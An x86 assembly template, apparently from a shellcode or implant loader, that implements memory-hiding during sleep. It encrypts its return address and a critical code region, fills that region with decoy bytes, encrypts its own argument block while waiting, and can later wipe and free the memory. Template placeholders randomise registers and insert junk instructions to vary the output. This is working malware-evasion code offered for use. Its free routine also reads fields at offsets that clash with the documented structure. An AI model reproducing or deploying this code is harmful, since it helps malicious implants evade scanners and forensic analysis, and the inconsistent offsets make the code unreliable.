.code32

// notice:
//   if VirtualProtect is zero, skip adjust page protect
//   if DecoyAddress or DecoySize is zero, skip fill decoy
//   CriticalSize must be 4 bytes aligned

// struct:
//   ======== Sleep ========                               ======== Free ========
//   [ebp + 0*4]  Method                                   [ebp + 0*4]  Method
//   [ebp + 1*4]  VirtualProtect                           [ebp + 1*4]  VirtualProtect
//   [ebp + 2*4]  WaitForSingleObject                      [ebp + 2*4]  VirtualFree
//   [ebp + 3*4]  Reserved                                 [ebp + 3*4]  ExitThread
//   [ebp + 4*4]  CriticalAddress                          [ebp + 4*4]  CriticalAddress
//   [ebp + 5*4]  CriticalSize                             [ebp + 5*4]  CriticalSize
//   [ebp + 6*4]  DecoyAddress                             [ebp + 6*4]  DecoyAddress
//   [ebp + 7*4]  DecoySize                                [ebp + 7*4]  DecoySize
//   [ebp + 8*4]  ShelterAddress
//   [ebp + 9*4]  TimerHandle

// step:
//   encrypt return address                                erase return address
//   encrypt critical instructions to shelter              adjust the critical memory page protect
//   adjust the critical memory page protect               fill critical memory with decoy
//   fill critical memory with decoy                       free critical memory page
//   encrypt stack about structure                         exit current thread
//   call WaitForSingleObject
//   decrypt stack about structure
//   recover the critical instructions from shelter
//   restore the critical memory page protect
//   decrypt return address

entry:
  // check argument pointer is NULL
  mov {{.RegV.ecx}}, [esp+4]                   {{iji}}
  test {{.RegV.ecx}}, {{.RegV.ecx}}            {{iji}}
  jz exit                                      {{iji}}

  // check method and dispatch
  mov {{.RegV.eax}}, [{{.RegV.ecx}}]           {{iji}}
  cmp {{.RegV.eax}}, 1                         {{iji}}
  je method_sleep                              {{iji}}
  cmp {{.RegV.eax}}, 2                         {{iji}}
  je method_free                               {{iji}}

 exit:
  ret 4                                        {{iji}}

method_sleep:
  // save context
  push {{.RegN.ebp}}                           {{iji}} // for save structure pointer
  push {{.RegN.ebx}}                           {{iji}} // for save crypto key
  push {{.RegN.esi}}                           {{iji}} // for save the memory page old protect

  // save structure pointer
  mov {{.RegN.ebp}}, [esp + 4*4]               {{iji}}

  // generate crypto key from registers
  call gen_key                                 {{iji}}

  // encrypt return address
  mov {{.RegV.ecx}}, [esp + 3*4]               {{iji}}
  xor {{.RegV.ecx}}, {{.RegN.ebx}}             {{iji}}
  mov [esp + 3*4], {{.RegV.ecx}}               {{iji}}

  // encrypt the critical memory to shelter
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set critical address
  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 5*4]     {{iji}} // set critical size
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 8*4]     {{iji}} // set shelter address
  call xor_buf                                 {{iji}}

  // encrypt address of WaitForSingleObject
  xor [{{.RegN.ebp}} + 2*4], {{.RegN.ebx}}     {{iji}}

  // adjust the page protect to PAGE_READWRITE
  push 0x04                                    {{iji}}
  call protect                                 {{iji}}

  // decrypt address of WaitForSingleObject
  xor [{{.RegN.ebp}} + 2*4], {{.RegN.ebx}}     {{iji}}

  // erase critical memory and deploy decoy
  call decoy                                   {{iji}}

  // prepare argument before encrypt stack
  xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // clear register
  dec {{.RegV.eax}}                            {{iji}} // calculate INFINITE (0xFFFFFFFF)
  mov {{.RegV.edx}}, {{.RegV.eax}}             {{iji}} // set INFINITE
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 9*4]     {{iji}} // set handle of hTimer
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 2*4]     {{iji}} // get address of WaitForSingleObject

  // save argument about WaitForSingleObject
  push {{.RegV.edx}}                           {{iji}}
  push {{.RegV.ecx}}                           {{iji}}
  push {{.RegV.eax}}                           {{iji}}

  // encrypt argument structure
  mov {{.RegV.ecx}}, {{.RegN.ebp}}             {{iji}} // set structure pointer
  mov {{.RegV.edx}}, 10*4                      {{iji}} // set the buffer size
  mov {{.RegV.eax}}, {{.RegN.ebp}}             {{iji}} // padding dst address
  call xor_buf                                 {{iji}}

  // Sleep with WaitForSingleObject
  pop {{.RegV.eax}}                            {{iji}} // get WaitForSingleObject address
  call {{.RegV.eax}}                           {{iji}} // call WaitForSingleObject

  // decrypt argument structure
  mov {{.RegV.ecx}}, {{.RegN.ebp}}             {{iji}} // set structure pointer
  mov {{.RegV.edx}}, 10*4                      {{iji}} // set the buffer size
  mov {{.RegV.eax}}, {{.RegN.ebp}}             {{iji}} // padding dst address
  call xor_buf                                 {{iji}}

  // recover the critical memory from shelter
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 8*4]     {{iji}} // set shelter address
  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 5*4]     {{iji}} // set shelter size
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set critical address
  call xor_buf                                 {{iji}}

  // recover the page protect to old protect
  push {{.RegN.esi}}                           {{iji}}
  call protect                                 {{iji}}

  // decrypt return address
  mov {{.RegV.ecx}}, [esp + 3*4]               {{iji}}
  xor {{.RegV.ecx}}, {{.RegN.ebx}}             {{iji}}
  mov [esp + 3*4], {{.RegV.ecx}}               {{iji}}

  // restore context
  pop {{.RegN.esi}}                            {{iji}}
  pop {{.RegN.ebx}}                            {{iji}}
  pop {{.RegN.ebp}}                            {{iji}}
  ret 4                                        {{iji}}

method_free:
  mov {{.RegN.ebp}}, [esp + 4]                 {{iji}} // save structure pointer
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 2*4]     {{iji}} // get address of ExitThread
  push {{.RegV.eax}}                           {{iji}} // save ExitThread address on stack

  // erase the critical memory
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 3*4]     {{iji}} // set address
  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set size
  shr {{.RegV.edx}}, 2                         {{iji}} // calculate the loop count
  xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // zero value
 loop_erase_free:
  mov [{{.RegV.ecx}}], {{.RegV.eax}}           {{iji}} // erase data
  add {{.RegV.ecx}}, 4                         {{iji}} // next field
  dec {{.RegV.edx}}                            {{iji}} // update loop count
  jnz loop_erase_free                          {{iji}} // check need erase next

  // call VirtualFree
  push 0x4000                                  {{iji}} // dwFreeType = MEM_RELEASE
  push 0                                       {{iji}} // dwSize = 0
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 3*4]     {{iji}} // reload address (ecx was clobbered)
  push {{.RegV.eax}}                           {{iji}} // lpAddress
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 1*4]     {{iji}} // get address of VirtualFree
  call {{.RegV.eax}}                           {{iji}} // call VirtualFree

  // call ExitThread
  pop {{.RegV.eax}}                            {{iji}} // restore ExitThread address
  push 0                                       {{iji}} // dwExitCode = 0
  call {{.RegV.eax}}                           {{iji}} // call ExitThread
  ret 4                                        {{iji}} // unreachable

xor_buf:
  push {{.RegN.esi}}                           {{iji}} // save register
  shr {{.RegV.edx}}, 2                         {{iji}} // calculate the loop count
 loop_xor:
  mov {{.RegN.esi}}, [{{.RegV.ecx}}]           {{iji}} // load data from source
  mov [{{.RegV.eax}}], {{.RegN.esi}}           {{iji}} // copy data to destination
  xor [{{.RegV.eax}}], {{.RegN.ebx}}           {{iji}} // encrypt data with crypto key
  add {{.RegV.ecx}}, 4                         {{iji}} // add source address
  add {{.RegV.eax}}, 4                         {{iji}} // add destination address
  dec {{.RegV.edx}}                            {{iji}} // update loop count
  jnz loop_xor                                 {{iji}} // check need decrypt again
  pop {{.RegN.esi}}                            {{iji}} // restore register
  ret                                          {{iji}}

gen_key:
  pop {{.RegV.eax}}                            {{iji}}
  push {{.RegV.eax}}                           {{iji}}
  mov {{.RegN.ebx}}, esp                       {{iji}}
  add {{.RegN.ebx}}, {{.Reg.eax}}              {{iji}}
  xor {{.RegN.ebx}}, {{.Reg.ecx}}              {{iji}}
  add {{.RegN.ebx}}, {{.Reg.edx}}              {{iji}}
  ror {{.RegN.ebx}}, {{.Less16.A}}             {{iji}}
  xor {{.RegN.ebx}}, {{.Reg.edi}}              {{iji}}
  rol {{.RegN.ebx}}, {{.Less32.A}}             {{iji}}
  add {{.RegN.ebx}}, {{.Reg.esi}}              {{iji}}
  ror {{.RegN.ebx}}, {{.Less16.B}}             {{iji}}
  ret                                          {{iji}}

protect:
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 1*4]     {{iji}} // get VirtualProtect address
  test {{.RegV.eax}}, {{.RegV.eax}}            {{iji}} // check VirtualProtect address is zero
  jz skip_protect                              {{iji}} // check need skip protect
  mov {{.RegV.eax}}, [esp+4]                   {{iji}} // read argument about new protect
  sub esp, 0x04                                {{iji}} // for save old protect
  push esp                                     {{iji}} // lpflOldProtect
  push {{.RegV.eax}}                           {{iji}} // new protect
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 5*4]     {{iji}} // set size of critical
  push {{.RegV.ecx}}                           {{iji}} // push size
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set address of critical
  push {{.RegV.ecx}}                           {{iji}} // push address
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 1*4]     {{iji}} // get address of VirtualProtect
  xor [{{.RegN.ebp}} + 1*4], {{.RegN.ebx}}     {{iji}} // encrypt address of VirtualProtect
  call {{.RegV.eax}}                           {{iji}} // call VirtualProtect
  mov {{.RegN.esi}}, [esp]                     {{iji}} // save old protect
  add esp, 0x04                                {{iji}} // restore stack for old protect
  xor [{{.RegN.ebp}} + 1*4], {{.RegN.ebx}}     {{iji}} // decrypt address of VirtualProtect

 skip_protect:
  ret 4                                        {{iji}} // return and release stack

decoy:
  // erase critical memory
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set critical address
  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 5*4]     {{iji}} // set critical size
  shr {{.RegV.edx}}, 2                         {{iji}} // calculate the loop count
  xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // calculate zero value
 loop_erase:
  mov [{{.RegV.ecx}}], {{.RegV.eax}}           {{iji}} // erase data
  add {{.RegV.ecx}}, 4                         {{iji}} // add critical address
  dec {{.RegV.edx}}                            {{iji}} // update loop count
  jnz loop_erase                               {{iji}} // check need erase next

  // fill critical memory with decoy
  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 6*4]     {{iji}} // get decoy address
  test {{.RegV.ecx}}, {{.RegV.ecx}}            {{iji}} // check decoy address is zero
  jz skip_decoy                                {{iji}} // check need skip fill
  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 7*4]     {{iji}} // set decoy size (loop count)
  test {{.RegV.edx}}, {{.RegV.edx}}            {{iji}} // check decoy size is zero
  jz skip_decoy                                {{iji}} // check need skip fill
  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set critical address

  push {{.RegN.ebx}}                           {{iji}} // save ebx
 loop_decoy:
  mov {{.RegN.bl}}, byte ptr [{{.RegV.ecx}}]   {{iji}} // load one byte from decoy
  mov [{{.RegV.eax}}], {{.RegN.bl}}            {{iji}} // write one byte to critical
  inc {{.RegV.ecx}}                            {{iji}} // update decoy address
  inc {{.RegV.eax}}                            {{iji}} // update critical address
  dec {{.RegV.edx}}                            {{iji}} // update loop count
  jnz loop_decoy                               {{iji}} // check need fill next
  pop {{.RegN.ebx}}                            {{iji}} // restore ebx

 skip_decoy:
  ret                                          {{iji}}
